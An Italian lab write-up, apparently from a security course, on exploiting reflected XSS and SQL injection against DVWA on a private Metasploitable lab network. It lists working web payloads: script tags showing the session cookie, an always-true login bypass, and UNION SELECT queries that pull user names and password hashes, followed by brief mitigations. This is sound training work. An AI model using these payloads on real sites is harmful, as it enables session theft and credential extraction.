# 🛡️ S6/L2: Sfruttamento di XSS e SQL Injection su DVWA

## 🖥️ Ambiente
- **Metasploitable (DVWA):** 192.168.60.2
- **Kali Linux (attaccante):** 192.168.50.2
- **Connessione:** Le macchine comunicano via ping.
- **DVWA Security Level:** Low.

---

## 🛠️ Passaggi

### 1. XSS Riflesso
- **Accesso:** Sezione "XSS Reflected".
- **Test payload:** `<script>alert('XSS')</script>`.
- **Cookie rubato:** `<script>alert(document.cookie)</script>`.
  - Output: `security=low; PHPSESSID=<session_id>`.
- 📂 Screenshot:
  - `XSSHTMLvulnerable.png`
  - `CookieAttuali.png`

### 2. SQL Injection
- **Accesso:** Sezione "SQL Injection".
- **Test vulnerabilità:** `' OR '1'='1`.
- **Scoperta colonne:** `' UNION SELECT null, null--`.
- **Estrazione dati:**
  - Nomi: `' UNION SELECT first_name, last_name FROM users--`.
  - Credenziali: `' UNION SELECT user, password FROM users--`.
  - Output: Utenti con hash delle password.
- 📂 Screenshot:
  - `BypassSQLsemprevera.png`
  - `testPayload.png`
  - `Estrasuserpassword.png`

---

## 📊 Conclusioni
- **XSS Riflesso:** Rubato il cookie di sessione.
- **SQL Injection:** Estratti nomi utenti e password (hash MD5).
- **Mitigazioni:** Sanitizzazione input/output, query parametrizzate, aumento sicurezza DVWA.

📂 File inclusi nella cartella:
- `XSSHTMLvulnerable.png`
- `CookieAttuali.png`
- `BypassSQLsemprevera.png`
- `testPayload.png`
- `Estrasuserpassword.png`
